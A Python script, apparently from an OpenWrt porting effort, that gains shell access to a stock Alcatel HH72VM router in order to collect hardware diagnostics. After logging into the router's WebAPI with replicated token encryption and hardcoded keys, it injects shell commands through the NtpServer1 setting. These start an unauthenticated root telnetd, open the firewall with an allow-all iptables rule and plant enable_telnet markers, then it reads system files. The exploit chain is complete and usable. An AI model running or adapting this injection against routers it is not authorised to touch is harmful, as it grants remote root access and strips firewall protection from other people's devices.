#!/usr/bin/env python3
"""Verify HH72VM-2BALAT3 stock hardware layout over Wi-Fi + WebAPI + Telnet."""

import argparse
import base64
import http.client
import json
import os
import re
import socket
import subprocess
import sys
import time

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

SCRIPTS_DIR = os.path.dirname(os.path.abspath(__file__))
REPO_ROOT = os.path.dirname(SCRIPTS_DIR)
FLASH_TOOLS_DIR = os.path.join(REPO_ROOT, "hh71vm-openwrt", "tools", "flash")
sys.path.insert(0, FLASH_TOOLS_DIR)

import tftp_dump_mtd  # noqa: E402

OBFUSCATE_KEY = "e5dl12XYVggihggafXWf0f2YSf2Xngd1"
COOKIE_PREFIX = "1D4B9765B16C3A64AD97489B1610498B"
DEFAULT_VERIFICATION_KEY = (
    "KSDHSDFOGQ5WERYTUIQWERTYUISDFG1HJZXCVCXBN2GDSMNDHKVKFsVBNf"
)


def get_wifi_profiles(interface="Wi-Fi 3"):
    """Return saved WLAN profile names for an interface without logging them."""
    out = subprocess.check_output(
        ["netsh", "wlan", "show", "profiles", f"interface={interface}"],
        encoding="oem",
        errors="replace",
    )
    profiles = []
    for line in out.splitlines():
        if ":" not in line:
            continue
        _, val = line.split(":", 1)
        val = val.strip()
        if val:
            profiles.append(val)
    return profiles


def get_interface_ipv4(interface="Wi-Fi 3", subnet_prefix=None):
    """Return the active IPv4 address bound to the specified Windows interface."""
    out = subprocess.check_output(
        ["netsh", "interface", "ipv4", "show", "addresses", f"name={interface}"],
        encoding="oem",
        errors="replace",
    )
    ips = re.findall(r"\b(\d+\.\d+\.\d+\.\d+)\b", out)
    if subnet_prefix:
        for ip in ips:
            if ip.startswith(subnet_prefix):
                return ip
    for ip in ips:
        if not ip.startswith("255.") and not ip.endswith(".1"):
            return ip
    return None


def probe_tcp(host, port, local_ip=None, timeout=2.0):
    """Return True if host:port accepts a TCP connection from local_ip."""
    try:
        sock = socket.create_connection(
            (host, port),
            timeout=timeout,
            source_address=(local_ip, 0) if local_ip else None,
        )
        sock.close()
        return True
    except OSError:
        return False


def ensure_wifi_connected(router_ip="10.0.3.1", interface="Wi-Fi 3", profile_index=0):
    """Ensure the USB Wi-Fi adapter is connected to profiles[profile_index]."""
    subnet_prefix = ".".join(router_ip.split(".")[:3]) + "."
    local_ip = get_interface_ipv4(interface, subnet_prefix=subnet_prefix)
    if local_ip and probe_tcp(router_ip, 80, local_ip=local_ip):
        return local_ip

    profiles = get_wifi_profiles(interface)
    if not (0 <= profile_index < len(profiles)):
        raise RuntimeError(
            f"Profile index {profile_index} out of range (found {len(profiles)} profiles on {interface})"
        )

    target_profile = profiles[profile_index]
    subprocess.run(
        [
            "netsh",
            "wlan",
            "set",
            "profileparameter",
            f"name={target_profile}",
            "connectionmode=auto",
        ],
        check=True,
        capture_output=True,
    )
    subprocess.run(
        [
            "netsh",
            "wlan",
            "connect",
            f"name={target_profile}",
            f"interface={interface}",
        ],
        check=True,
        capture_output=True,
    )
    print(f"Requested {interface} connection using profile index {profile_index} (len={len(target_profile)}).")

    deadline = time.time() + 20.0
    while time.time() < deadline:
        local_ip = get_interface_ipv4(interface, subnet_prefix=subnet_prefix)
        if local_ip and probe_tcp(router_ip, 80, local_ip=local_ip):
            return local_ip
        time.sleep(1.0)

    raise RuntimeError(f"{interface} failed to reach {router_ip}:80 within 20s")


def xor_obfuscate(text):
    """Apply the Alcatel WebUI nibble obfuscation using OBFUSCATE_KEY."""
    out = []
    klen = len(OBFUSCATE_KEY)
    for idx, ch in enumerate(text):
        k = ord(OBFUSCATE_KEY[idx % klen])
        c = ord(ch)
        out.append((240 & k) | ((15 & c) ^ (15 & k)))
        out.append((240 & k) | ((c >> 4) ^ (15 & k)))
    return "".join(chr(b) for b in out)


def encrypt_token(token, param0, param1):
    """Encrypt the session token using AES-128-CBC identically to build.js encrypt_c."""
    obfuscated = xor_obfuscate(str(token)).encode("utf-8")
    key = str(param0).encode("utf-8")
    iv = str(param1).encode("utf-8")
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(obfuscated, AES.block_size))
    return base64.b64encode(encrypted).decode("ascii")


def redact_sensitive(text):
    """Mask MAC addresses, IMEI/IMSI/ICCID values, and WPA PSKs in output."""
    text = re.sub(
        r"\b([0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2}\b",
        "<MAC_REDACTED>",
        text,
    )
    text = re.sub(
        r'(?i)\b(imei|imsi|iccid|msisdn|password|psk|passphrase|key)\s*([=:])\s*\S+',
        r"\1\2<REDACTED>",
        text,
    )
    text = re.sub(r"\b\d{15,20}\b", "<ID_REDACTED>", text)
    return text


class WebApiClient:
    """Minimal HTTP JSON-RPC client for the Alcatel HH71/HH72 GoAhead WebAPI."""

    def __init__(self, router_ip, local_ip):
        """Initialize connection targeting router_ip bound to local_ip."""
        self.router_ip = router_ip
        self.local_ip = local_ip
        self.verif_key = self._fetch_verification_key()
        self.verif_token = None
        self.cookies = {}

    def _http_request(self, method, path, body=None, extra_headers=None):
        conn = http.client.HTTPConnection(
            self.router_ip,
            80,
            timeout=10,
            source_address=(self.local_ip, 0),
        )
        headers = extra_headers or {}
        try:
            conn.request(method, path, body=body, headers=headers)
            resp = conn.getresponse()
            raw = resp.read()
            for hdr_name, hdr_val in resp.getheaders():
                if hdr_name.lower() == "set-cookie":
                    cookie_pair = hdr_val.split(";", 1)[0]
                    if "=" in cookie_pair:
                        ck, cv = cookie_pair.split("=", 1)
                        self.cookies[ck.strip()] = cv.strip()
            return resp.status, raw
        finally:
            conn.close()

    def _fetch_verification_key(self):
        status, raw = self._http_request("GET", "/dist/build.js")
        if status == 200:
            js = raw.decode("utf-8", errors="ignore")
            m = re.search(
                r'_TclRequestVerificationKey["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                js,
            )
            if m:
                return m.group(1)
        return DEFAULT_VERIFICATION_KEY

    def call(self, method, params=None):
        """Invoke a JSON-RPC 2.0 method on /jrd/webapi and return parsed JSON."""
        payload = json.dumps(
            {
                "id": "12",
                "jsonrpc": "2.0",
                "method": method,
                "params": params if params is not None else {},
            }
        ).encode("utf-8")
        headers = {
            "Content-Type": "application/json;charset=UTF-8",
            "Accept": "application/json, text/plain, */*",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": f"http://{self.router_ip}",
            "Referer": f"http://{self.router_ip}/index.html",
            "_TclRequestVerificationKey": self.verif_key,
        }
        if self.verif_token:
            headers["_TclRequestVerificationToken"] = self.verif_token
        if self.cookies:
            headers["Cookie"] = "; ".join(f"{k}={v}" for k, v in self.cookies.items())

        status, raw = self._http_request("POST", "/jrd/webapi", body=payload, extra_headers=headers)
        if status != 200:
            raise RuntimeError(f"HTTP {status} for {method}")
        return json.loads(raw.decode("utf-8"))

    def login(self, username, password):
        """Authenticate and store the AES-encrypted session token."""
        state_resp = self.call("GetLoginState")
        state = state_resp.get("result", {})
        pw_encrypt = state.get("PwEncrypt", 1) == 1
        params = {
            "UserName": xor_obfuscate(username) if pw_encrypt else username,
            "Password": xor_obfuscate(password) if pw_encrypt else password,
        }
        resp = self.call("Login", params)
        if "error" in resp:
            raise RuntimeError(f"Login failed: {resp['error']}")
        result = resp["result"]
        self.verif_token = encrypt_token(
            result["token"], result["param0"], result["param1"]
        )
        self.cookies["t"] = COOKIE_PREFIX + self.verif_token
        return result

    def logout(self):
        """Log out cleanly if a session token is active."""
        if self.verif_token:
            try:
                self.call("Logout", {})
            finally:
                self.verif_token = None


def wait_for_telnet(router_ip, local_ip, ports=(2323, 23), timeout=6.0):
    """Poll router_ip on candidate Telnet ports for up to timeout seconds."""
    deadline = time.time() + timeout
    while time.time() < deadline:
        for port in ports:
            if probe_tcp(router_ip, port, local_ip=local_ip, timeout=1.0):
                return port
        time.sleep(0.5)
    return None


def send_ntp_command(client, orig_settings, shell_cmd):
    """Trigger stock NTP handler command execution via SetSystemSettings."""
    orig_ntp2 = orig_settings.get("NtpServer2") or "1.openwrt.pool.ntp.org"
    mod_settings = dict(orig_settings)
    # Keep NtpServer1 short so fixed-size C buffers do not truncate the command
    mod_settings["NtpServer1"] = f";{shell_cmd};"
    mod_settings["NtpServer2"] = orig_ntp2
    resp = client.call("SetSystemSettings", mod_settings)
    if "error" in resp:
        raise RuntimeError(f"SetSystemSettings failed: {resp['error']}")


def reboot_and_reconnect(client, args):
    """Reboot router via WebAPI and wait for Wi-Fi 3 reconnection."""
    print("Rebooting router via SetDeviceReboot (section 3 fallback)...")
    try:
        resp = client.call("SetDeviceReboot", {})
        if "error" in resp:
            raise RuntimeError(f"SetDeviceReboot failed: {resp['error']}")
    finally:
        try:
            client.logout()
        except Exception:
            pass

    print("Waiting 35s for router shutdown/boot before polling Wi-Fi 3...")
    time.sleep(35.0)
    deadline = time.time() + 65.0
    while time.time() < deadline:
        try:
            local_ip = ensure_wifi_connected(
                router_ip=args.router_ip,
                interface=args.interface,
                profile_index=args.profile_index,
            )
            return local_ip
        except Exception:
            time.sleep(3.0)
    raise RuntimeError(f"Router {args.router_ip} did not come back within 100s after reboot")


def collect_diagnostics(router_ip, local_ip, telnet_port):
    """Run read-only hardware diagnostics over Telnet and return redacted text."""
    # Establish connection explicitly from the Wi-Fi 3 IP
    sock = socket.create_connection(
        (router_ip, telnet_port),
        timeout=10,
        source_address=(local_ip, 0),
    )
    tc = tftp_dump_mtd.TelnetControl.__new__(tftp_dump_mtd.TelnetControl)
    tc.sock = sock
    tc.sock.settimeout(2.0)
    time.sleep(0.5)
    tc._drain()

    commands = [
        ("VERSION", "cat /proc/version"),
        ("CPUINFO", "cat /proc/cpuinfo"),
        ("MTD", "cat /proc/mtd"),
        ("MOUNT", "mount; df -h"),
        (
            "WLAN",
            "ls -la /proc/wlan0 /proc/wlan1 2>/dev/null; "
            "head -n 40 /proc/wlan0/mib_rf /proc/wlan1/mib_rf 2>/dev/null",
        ),
        (
            "DMESG_HW",
            "dmesg | grep -iE 'bond|rfe|phy|chip|hwsetting|8197|8812|8814|rtl|mtd|spi|flash|eth[01]|usb|rndis'",
        ),
        ("SWITCH", "cat /proc/rtl865x/port_status 2>/dev/null"),
        ("OEM_START", "cat /jffs2/bin/oem_start.sh 2>/dev/null"),
    ]
    sections = []
    try:
        for label, cmd in commands:
            out = tc.cmd(cmd, max_wait=15.0).decode("latin1", errors="replace")
            sections.append(f"=== {label} ===\n{redact_sensitive(out.strip())}\n")
    finally:
        tc.close()
    return "\n".join(sections)


def main():
    """Authenticate, enable Telnet (including section 2/3 fallbacks), and inspect hardware."""
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--router-ip", default="10.0.3.1")
    parser.add_argument("--interface", default="Wi-Fi 3")
    parser.add_argument("--profile-index", type=int, default=0)
    parser.add_argument("--username", default="admin")
    parser.add_argument(
        "--password",
        default=os.environ.get("HH72_PASS", ""),
        help="Router WebUI password (or set HH72_PASS env var)",
    )
    parser.add_argument("--telnet-port", type=int, default=2323)
    parser.add_argument(
        "--out",
        default=os.path.join(REPO_ROOT, "diagnostics-redacted.raw.txt"),
    )
    args = parser.parse_args()

    if not args.password:
        raise SystemExit("Password required via --password or HH72_PASS")

    local_ip = ensure_wifi_connected(
        router_ip=args.router_ip,
        interface=args.interface,
        profile_index=args.profile_index,
    )
    print(f"Connected to {args.router_ip} via {args.interface} ({local_ip})")

    active_port = wait_for_telnet(
        args.router_ip, local_ip, ports=(args.telnet_port, 23), timeout=1.5
    )

    if not active_port:
        client = WebApiClient(args.router_ip, local_ip)
        client.login(args.username, args.password)
        print("WebAPI login succeeded.")

        orig_settings = None
        ntp_dirty = False
        try:
            sys_settings = client.call("GetSystemSettings")
            if "error" in sys_settings:
                raise RuntimeError(f"GetSystemSettings failed: {sys_settings['error']}")
            orig_settings = sys_settings["result"]
            print(
                f"Original NTP settings: NtpServer1={orig_settings.get('NtpServer1')}, "
                f"NtpServer2={orig_settings.get('NtpServer2')}"
            )

            # 1) Direct telnetd invocations + iptables INPUT allow
            for label, cmd in (
                (f"telnetd:{args.telnet_port}", f"telnetd -p {args.telnet_port} -l /bin/sh"),
                ("telnetd:23", "telnetd -l /bin/sh"),
                ("iptables:allow", "iptables -I INPUT -j ACCEPT"),
            ):
                ntp_dirty = True
                send_ntp_command(client, orig_settings, cmd)
                print(f"Sent NTP command ({label}); polling 2s...")
                active_port = wait_for_telnet(
                    args.router_ip, local_ip, ports=(args.telnet_port, 23), timeout=2.0
                )
                if active_port:
                    break

            # 2) Section 2/3 enable_telnet markers + 6s check before restore
            if not active_port:
                for cmd in (
                    "touch /jffs2/resource/jrdcfg/enable_telnet",
                    "touch /jrd-resource/resource/jrdcfg/enable_telnet",
                    "chmod 775 /jrd-resource/resource/jrdcfg/enable_telnet",
                    "chmod 775 /jffs2/resource/jrdcfg/enable_telnet",
                ):
                    ntp_dirty = True
                    send_ntp_command(client, orig_settings, cmd)
                    time.sleep(1.5)
                print("Created enable_telnet markers (sections 2 & 3); polling 6s...")
                active_port = wait_for_telnet(
                    args.router_ip, local_ip, ports=(args.telnet_port, 23), timeout=6.0
                )

            if orig_settings is not None and ntp_dirty:
                client.call("SetSystemSettings", orig_settings)
                ntp_dirty = False
                print("Restored original NTP settings.")

            # 3) Section 3 reboot fallback
            if not active_port:
                local_ip = reboot_and_reconnect(client, args)
                print(f"Reconnected to {args.router_ip} via {args.interface} ({local_ip}); polling Telnet...")
                active_port = wait_for_telnet(
                    args.router_ip, local_ip, ports=(23, args.telnet_port), timeout=10.0
                )
        finally:
            if orig_settings is not None and ntp_dirty:
                try:
                    client.call("SetSystemSettings", orig_settings)
                    print("Restored original NTP settings.")
                except Exception as exc:
                    print(f"Warning: failed to restore NTP settings: {exc}")
            client.logout()

    if not active_port:
        print(f"TELNET_UNAVAILABLE: neither port 23 nor port {args.telnet_port} opened.")
        return 2

    print(f"Telnet active on {args.router_ip}:{active_port}; collecting diagnostics...")
    report = collect_diagnostics(args.router_ip, local_ip, active_port)
    with open(args.out, "w", encoding="utf-8") as fh:
        fh.write(report)
    print(f"Saved redacted diagnostics to {args.out}")
    print(report)
    return 0


if __name__ == "__main__":
    sys.exit(main())
